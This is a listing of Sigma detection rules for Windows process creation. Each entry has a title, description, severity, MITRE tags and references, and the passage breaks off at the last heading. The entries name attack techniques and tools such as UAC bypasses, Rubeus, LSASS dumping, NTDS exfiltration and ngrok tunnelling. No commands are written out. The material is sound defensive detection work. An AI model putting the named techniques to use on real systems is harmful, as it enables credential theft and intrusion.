### Command Line Execution with Suspicious URL and AppData Strings
    
    Detects a suspicious command line execution that includes an URL and AppData string in the command line parameters as used by several droppers (js/vbs > powershell)

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059.003
    * MITRE: attack.t1059.001
    * MITRE: attack.command_and_control
    * MITRE: attack.t1105
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_cmd_http_appdata.yml
* https://www.hybrid-analysis.com/sample/3a1f01206684410dbe8f1900bbeaaa543adfcd07368ba646b499fa5274b9edf6?environmentId=100

* https://www.hybrid-analysis.com/sample/f16c729aad5c74f19784a24257236a8bbe27f7cdc4a89806031ec7f1bebbd475?environmentId=100

    
### KrbRelay Hack Tool
    
    Detects the use of KrbRelay, a Kerberos relaying tool

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1558.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_hack_krbrelay.yml
* https://github.com/cube0x0/KrbRelay

    
### Cabinet File Expansion
    
    Adversaries can use the inbuilt expand utility to decompress cab files as seen in recent Iranian MeteorExpress attack

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_expand_cabinet_files.yml
* https://labs.sentinelone.com/meteorexpress-mysterious-wiper-paralyzes-iranian-trains-with-epic-troll

* https://blog.malwarebytes.com/threat-intelligence/2021/08/new-variant-of-konni-malware-used-in-campaign-targetting-russia/

    
### Xwizard DLL Sideloading
    
    Detects the execution of Xwizard tool from the non-default directory which can be used to sideload a custom xwizards.dll

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1574.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_dll_sideload_xwizard.yml
* https://lolbas-project.github.io/lolbas/Binaries/Xwizard/

* http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/

    
### Suspicious Service Binary Directory
    
    Detects a service binary running in a suspicious directory

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1202
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_service_dir.yml
* https://blog.truesec.com/2021/03/07/exchange-zero-day-proxylogon-and-hafnium/

    
### Ie4uinit Lolbin Use From Invalid Path
    
    Detect use of ie4uinit.exe to execute commands from a specially prepared ie4uinit.inf file from a directory other than the usual directories

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_lolbin_ie4uinit.yml
* https://lolbas-project.github.io/lolbas/Binaries/Ie4uinit/

* https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/

    
### Base64 Encoded Listing of Shadowcopy
    
    Detects base64 encoded listing Win32_Shadowcopy

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_base64_listing_shadowcopy.yml
* https://github.com/Neo23x0/Raccine/blob/main/yara/mal_revil.yar

    
### TrustedPath UAC Bypass Pattern
    
    Detects indicators of a UAC bypass method by mocking directories

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1548.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_uac_bypass_trustedpath.yml
* https://medium.com/tenable-techblog/uac-bypass-by-mocking-trusted-directories-24a96675f6e

* https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows

* https://github.com/netero1010/TrustedPath-UACBypass-BOF

    
### Invoke-Obfuscation Via Stdin
    
    Detects Obfuscated Powershell via Stdin in Scripts

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_invoke_obfuscation_via_stdin.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### DInject PowerShell Cradle CommandLine Flags
    
    Detects the use of the Dinject PowerShell cradle based on the specific flags

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1055
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_dinjector.yml
* https://github.com/snovvcrash/DInjector

    
### Node Process Executions
    
    Detects the execution of other scripts using the Node executable packaged with Adobe Creative Cloud

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1127
    * MITRE: attack.t1059.007
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_creative_cloud_node_abuse.yml
* https://twitter.com/mttaggart/status/1511804863293784064

    
### UAC Bypass Using PkgMgr and DISM
    
    Detects the pattern of UAC Bypass using pkgmgr.exe and dism.exe (UACMe 23)

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_uac_bypass_pkgmgr_dism.yml
* https://github.com/hfiref0x/UACME

    
### Suspicious Program Names
    
    Detects suspicious patterns in program names or folders that are often found in malicious samples or hacktools

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_progname.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1560.001/T1560.001.md

    
### Suspicious PowerShell Parent Process
    
    Detects a suspicious parents of powershell.exe

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_powershell_parent_process.yml
* https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=26

    
### Ngrok Usage
    
    Detects the use of Ngrok, a utility used for port forwarding and tunneling, often used by threat actors to make local protected services publicly available. Involved domains are bin.equinox.io for download and *.ngrok.io for connections.

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.t1572
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_ngrok_pua.yml
* https://ngrok.com/docs

* https://www.fireeye.com/blog/threat-research/2021/05/shining-a-light-on-darkside-ransomware-operations.html

* https://stackoverflow.com/questions/42442320/ssh-tunnel-to-ngrok-and-initiate-rdp

* https://www.virustotal.com/gui/file/58d21840d915aaf4040ceb89522396124c82f325282f805d1085527e1e2ccfa1/detection

* https://cybleinc.com/2021/02/15/ngrok-platform-abused-by-hackers-to-deliver-a-new-wave-of-phishing-attacks/.

    
### Suspicious NT Resource Kit Auditpol Usage
    
    Threat actors can use an older version of the auditpol binary available inside the NT resource kit to change audit policy configuration to impair detection capability. This can be carried out by selectively disabling/removing certain audit policies as well as restoring a custom policy owned by the threat actor.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_nt_resource_kit_auditpol_usage.yml
* https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Windows%202000%20Resource%20Kit%20Tools/AuditPol

    
### Cscript Visual Basic Script Execution
    
    Adversaries may abuse Visual Basic (VB) for execution

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_cscript_vbs.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.005/T1059.005.md

    
### Malicious Windows Script Components File Execution by TAEF Detection
    
    Windows Test Authoring and Execution Framework (TAEF) framework allows you to run automation by executing tests files written on different languages (C, C#, Microsoft COM Scripting interfaces). Adversaries may execute malicious code (such as WSC file with VBScript, dll and so on) directly by running te.exe

    * Level: low
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_use_of_te_bin.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Te.yml

* https://twitter.com/pabraeken/status/993298228840992768

* https://docs.microsoft.com/en-us/windows-hardware/drivers/taef/

    
### Uninstall Crowdstrike Falcon
    
    Adversaries may disable security tools to avoid possible detection of their tools and activities by uninstalling Crowdstrike Falcon

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_uninstall_crowdstrike_falcon.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md

    
### DIT Snapshot Viewer Use
    
    Detects the use of Ditsnap tool. Seems to be a tool for ransomware groups.

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_ditsnap.yml
* https://thedfirreport.com/2020/06/21/snatch-ransomware/

* https://github.com/yosqueoy/ditsnap

    
### Conti NTDS Exfiltration Command
    
    Detects a command used by conti to exfiltrate NTDS

    * Level: high
    * MITRE: attack.collection
    * MITRE: attack.t1560
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_malware_conti_7zip.yml
* https://twitter.com/vxunderground/status/1423336151860002816?s=20

* https://www.virustotal.com/gui/file/03e9b8c2e86d6db450e5eceec057d7e369ee2389b9daecaf06331a95410aa5f8/detection

    
### PurpleSharp Indicator
    
    Detects the execution of the PurpleSharp adversary simulation tool

    * Level: critical
    * MITRE: attack.t1587
    * MITRE: attack.resource_development
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_purplesharp_indicators.yml
* https://github.com/mvelazc0/PurpleSharp

    
### Renamed Binary
    
    Detects the execution of a renamed binary often used by attackers or malware leveraging new Sysmon OriginalFileName datapoint.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_renamed_binary.yml
* https://attack.mitre.org/techniques/T1036/

* https://mgreen27.github.io/posts/2019/05/12/BinaryRename.html

* https://mgreen27.github.io/posts/2019/05/29/BinaryRename2.html

    
### Exploit for CVE-2017-0261
    
    Detects Winword starting uncommon sub process FLTLDR.exe as used in exploits for CVE-2017-0261 and CVE-2017-0262

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1203
    * MITRE: attack.t1204.002
    * MITRE: attack.initial_access
    * MITRE: attack.t1566.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_exploit_cve_2017_0261.yml
* https://www.fireeye.com/blog/threat-research/2017/05/eps-processing-zero-days.html

    
### Dridex Process Pattern
    
    Detects typical Dridex process patterns

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1055
    * MITRE: attack.discovery
    * MITRE: attack.t1135
    * MITRE: attack.t1033
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_malware_dridex.yml
* https://app.any.run/tasks/993daa5e-112a-4ff6-8b5a-edbcec7c7ba3

    
### Suspicious ZipExec Execution
    
    ZipExec is a Proof-of-Concept (POC) tool to wrap binary-based tools into a password-protected zip file.

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    * MITRE: attack.t1202
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_zipexec.yml
* https://twitter.com/SBousseaden/status/1451237393017839616

* https://github.com/Tylous/ZipExec

    
### Direct Autorun Keys Modification
    
    Detects direct modification of autostart extensibility point (ASEP) in registry using reg.exe.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1547.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_direct_asep_reg_keys_modification.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md

    
### PsExec Tool Execution
    
    Detects PsExec service installation and execution events (service and Sysmon)

    * Level: low
    * MITRE: attack.execution
    * MITRE: attack.t1569.002
    * MITRE: attack.s0029
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_tool_psexec.yml
* https://www.jpcert.or.jp/english/pub/sr/ir_research.html

* https://jpcertcc.github.io/ToolAnalysisResultSheet

    
### Query Registry
    
    Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.

    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1012
    * MITRE: attack.t1007
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_query_registry.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1012/T1012.md

    
### Suspicious Diantz Download and Compress Into a CAB File
    
    Download and compress a remote file and store it in a cab file on local machine.

    * Level: medium
    * MITRE: attack.command_and_control
    * MITRE: attack.t1105
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_lolbas_diantz_remote_cab.yml
* https://lolbas-project.github.io/lolbas/Binaries/Diantz/

    
### Fsutil Suspicious Invocation
    
    Detects suspicious parameters of fsutil (deleting USN journal, configuring it with small size, etc). Might be used by ransomwares during the attack (seen by NotPetya and others).

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1070
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_fsutil_usage.yml
* https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-usn

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070/T1070.md

* https://eqllib.readthedocs.io/en/latest/analytics/c91f422a-5214-4b17-8664-c5fcf115c0a2.html

    
### Visual Basic Command Line Compiler Usage
    
    Detects successful code compilation via Visual Basic Command Line Compiler that utilizes Windows Resource to Object Converter.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_visual_basic_compiler.yml
* https://lolbas-project.github.io/lolbas/Binaries/Vbc/

    
### ProtocolHandler.exe Downloaded Suspicious File
    
    Emulates attack via documents through protocol handler in Microsoft Office. On successful execution you should see Microsoft Word launch a blank file.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_protocolhandler_susp_file.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md

    
### Shadow Copies Creation Using Operating Systems Utilities
    
    Shadow Copies creation using operating systems utilities, possible credential access

    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1003
    * MITRE: attack.t1003.002
    * MITRE: attack.t1003.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_shadow_copies_creation.yml
* https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment

* https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/tutorial-for-ntds-goodness-vssadmin-wmis-ntdsdit-system/

    
### Process Start From Suspicious Folder
    
    Detects process start from rare or uncommon folders like temporary folder or folders that usually don't contain executable files

    * Level: low
    * MITRE: attack.execution
    * MITRE: attack.t1204
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_run_folder.yml
* Malware sandbox results

    
### MSHTA Spawning Windows Shell
    
    Detects a Windows command line executable started from MSHTA

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.005
    * MITRE: car.2013-02-003
    * MITRE: car.2013-03-001
    * MITRE: car.2014-04-003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_mshta_spawn_shell.yml
* https://www.trustedsec.com/july-2015/malicious-htas/

    
### Renamed ZOHO Dctask64
    
    Detects a renamed dctask64.exe used for process injection, command execution, process creation with a signed binary by ZOHO Corporation

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036
    * MITRE: attack.t1055.001
    * MITRE: attack.t1202
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_renamed_dctask64.yml
* https://twitter.com/gN3mes1s/status/1222088214581825540

* https://twitter.com/gN3mes1s/status/1222095963789111296

* https://twitter.com/gN3mes1s/status/1222095371175911424

    
### Suspicious Characters in CommandLine
    
    Detects suspicious characters in the command line, which could be a sign of obfuscation

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_commandline_chars.yml
* https://www.wietzebeukema.nl/blog/windows-command-line-obfuscation

    
### PowerShell Encoded Character Syntax
    
    Detects suspicious encoded character syntax often used for defense evasion

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_powershell_encoded_param.yml
* https://twitter.com/0gtweet/status/1281103918693482496

    
### Exports Critical Registry Keys To a File
    
    Detects the export of a crital Registry key to a file.

    * Level: high
    * MITRE: attack.exfiltration
    * MITRE: attack.t1012
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_regedit_export_critical_keys.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regedit.yml

* https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f

    
### UAC Bypass Using ComputerDefaults
    
    Detects the pattern of UAC Bypass using computerdefaults.exe (UACMe 59)

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_uac_bypass_computerdefaults.yml
* https://github.com/hfiref0x/UACME

    
### SQL Client Tools PowerShell Session Detection
    
    This rule detects execution of a PowerShell code through the sqltoolsps.exe utility, which is included in the standard set of utilities supplied with the Microsoft SQL Server Management studio. Script blocks are not logged in this case, so this utility helps to bypass protection mechanisms based on the analysis of these logs.

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1127
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_use_of_sqltoolsps_bin.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Sqltoolsps.yml

* https://twitter.com/pabraeken/status/993298228840992768

    
### Abusing Print Executable
    
    Attackers can use print.exe for remote file copy

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_print.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Print.yml

* https://twitter.com/Oddvarmoe/status/985518877076541440

    
### Suspicious Certutil Command
    
    Detects a suspicious Microsoft certutil execution with sub commands like 'decode' sub command, which is sometimes used to decode malicious code with the built-in certutil utility

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1140
    * MITRE: attack.command_and_control
    * MITRE: attack.t1105
    * MITRE: attack.s0160
    * MITRE: attack.g0007
    * MITRE: attack.g0010
    * MITRE: attack.g0045
    * MITRE: attack.g0049
    * MITRE: attack.g0075
    * MITRE: attack.g0096
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_certutil_command.yml
* https://twitter.com/JohnLaTwC/status/835149808817991680

* https://blogs.technet.microsoft.com/pki/2006/11/30/basic-crl-checking-with-certutil/

* https://www.trustedsec.com/2017/07/new-tool-release-nps_payload/

* https://twitter.com/egre55/status/1087685529016193025

* https://lolbas-project.github.io/lolbas/Binaries/Certutil/

    
### Rubeus Hack Tool
    
    Detects command line parameters used by Rubeus hack tool

    * Level: critical
    * MITRE: attack.credential_access
    * MITRE: attack.t1003
    * MITRE: attack.t1558.003
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1550.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_hack_rubeus.yml
* https://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/

    
### GfxDownloadWrapper.exe Downloads File from Suspicious URL
    
    Detects when GfxDownloadWrapper.exe downloads file from non standard URL

    * Level: medium
    * MITRE: attack.command_and_control
    * MITRE: attack.t1105
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_file_download_via_gfxdownloadwrapper.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/GfxDownloadWrapper.yml

    
### Writing Of Malicious Files To The Fonts Folder
    
    Monitors for the hiding possible malicious files in the C:\Windows\Fonts\ location. This folder doesn't require admin privillege to be written and executed from.

    * Level: medium
    * MITRE: attack.t1211
    * MITRE: attack.t1059
    * MITRE: attack.defense_evasion
    * MITRE: attack.persistence
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_hiding_malware_in_fonts_folder.yml
* https://thedfirreport.com/2020/04/20/sqlserver-or-the-miner-in-the-basement/

    
### NodejsTools PressAnyKey Lolbin
    
    Detects a certain command line flag combination used by Microsoft.NodejsTools.PressAnyKey.exe that can be used to execute any other binary

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_pressynkey_lolbin.yml
* https://twitter.com/mrd0x/status/1463526834918854661

    
### Suspicious Plink Remote Forwarding
    
    Detects suspicious Plink tunnel remote forarding to a local port

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.t1572
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_plink_remote_forward.yml
* https://www.real-sec.com/2019/04/bypassing-network-restrictions-through-rdp-tunneling/

* https://medium.com/@informationsecurity/remote-ssh-tunneling-with-plink-exe-7831072b3d7d

    
### Command Line Path Traversal Evasion
    
    Detects the attempt to evade or obfuscate the executed command on the CommandLine using bogus path traversal

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_commandline_path_traversal_evasion.yml
* https://twitter.com/hexacorn/status/1448037865435320323

* https://twitter.com/Gal_B1t/status/1062971006078345217

    
### Netsh Port Forwarding
    
    Detects netsh commands that configure a port forwarding (PortProxy)

    * Level: medium
    * MITRE: attack.lateral_movement
    * MITRE: attack.defense_evasion
    * MITRE: attack.command_and_control
    * MITRE: attack.t1090
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_netsh_port_fwd.yml
* https://www.fireeye.com/blog/threat-research/2019/01/bypassing-network-restrictions-through-rdp-tunneling.html

* https://adepts.of0x.cc/netsh-portproxy-code/

* https://www.dfirnotes.net/portproxy_detection/

    
### Ryuk Ransomware
    
    Detects Ryuk ransomware activity

    * Level: critical
    * MITRE: attack.persistence
    * MITRE: attack.t1547.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_malware_ryuk.yml
* https://app.any.run/tasks/d860402c-3ff4-4c1f-b367-0237da714ed1/

    
### Process Access via TrolleyExpress Exclusion
    
    Detects a possible process memory dump that uses the white-listed Citrix TrolleyExpress.exe filename as a way to dump the lsass process memory

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.011
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_trolleyexpress_procdump.yml
* https://twitter.com/_xpn_/status/1491557187168178176

* https://www.youtube.com/watch?v=Ie831jF0bb0

    
### Suspicious AdFind Enumerate
    
    Detects the execution of a AdFind for enumeration

    * Level: medium
    * MITRE: attack.discovery
    * MITRE: attack.t1087.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_adfind_enumerate.yml
* https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1087.002/T1087.002.md

    
### Disabled IE Security Features
    
    Detects command lines that indicate unwanted modifications to registry keys that disable important Internet Explorer security features

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_disable_ie_features.yml
* https://unit42.paloaltonetworks.com/operation-ke3chang-resurfaces-with-new-tidepool-malware/

    
### PowerShell Base64 Encoded Shellcode
    
    Detects Base64 encoded Shellcode

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_powershell_b64_shellcode.yml
* https://twitter.com/cyb3rops/status/1063072865992523776

    
### Lazarus Loaders
    
    Detects different loaders as described in various threat reports on Lazarus group activity

    * Level: critical
    * MITRE: attack.g0032
    * MITRE: attack.execution
    * MITRE: attack.t1059
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_lazarus_loader.yml
* https://www.hvs-consulting.de/lazarus-report/

* https://securelist.com/lazarus-covets-covid-19-related-intelligence/99906/

    
### AnyDesk Silent Installation
    
    AnyDesk Remote Desktop silent installation can be used by attacker to gain remote access.

    * Level: high
    * MITRE: attack.t1219
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_anydesk_silent_install.yml
* https://twitter.com/TheDFIRReport/status/1423361119926816776?s=20

* https://support.anydesk.com/Automatic_Deployment

    
### Custom Class Execution via Xwizard
    
    Detects the execution of Xwizard tool with specific arguments which utilized to run custom class properties.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_class_exec_xwizard.yml
* https://lolbas-project.github.io/lolbas/Binaries/Xwizard/

    
### Suspicious Compression Tool Parameters
    
    Detects suspicious command line arguments of common data compression tools

    * Level: high
    * MITRE: attack.collection
    * MITRE: attack.t1560.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_compression_params.yml
* https://twitter.com/SBousseaden/status/1184067445612535811

    
### MsiExec Web Install
    
    Detects suspicious msiexec process starts with web addresses as parameter

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.007
    * MITRE: attack.command_and_control
    * MITRE: attack.t1105
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_msiexec_web_install.yml
* https://blog.trendmicro.com/trendlabs-security-intelligence/attack-using-windows-installer-msiexec-exe-leads-lokibot/

    
### Execution of Powershell Script in Public Folder
    
    This rule detects execution of PowerShell scripts located in the C:\Users\Public folder

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_powershell_public_folder.yml
* https://www.mandiant.com/resources/evolution-of-fin7

    
### Possible Shim Database Persistence via sdbinst.exe
    
    Detects installation of a new shim using sdbinst.exe. A shim can be used to load malicious DLLs into applications.

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1546.011
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_sdbinst_shim_persistence.yml
* https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html

    
### Exploited CVE-2020-10189 Zoho ManageEngine
    
    Detects the exploitation of Zoho ManageEngine Desktop Central Java Deserialization vulnerability reported as CVE-2020-10189

    * Level: critical
    * MITRE: attack.initial_access
    * MITRE: attack.t1190
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    * MITRE: attack.t1059.003
    * MITRE: attack.s0190
    * MITRE: cve.2020.10189
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_exploit_cve_2020_10189.yml
* https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html

* https://vulmon.com/exploitdetails?qidtp=exploitdb&qid=48224

    
### File Download with Headless Browser
    
    This is an unusual method to download files. It starts a browser headless and downloads a file from a location. This can be used by threat actors to download files.

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.t1105
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_headless_browser_file_download.yml
* https://twitter.com/mrd0x/status/1478234484881436672?s=12

    
### Compress Data and Lock With Password for Exfiltration With WINZIP
    
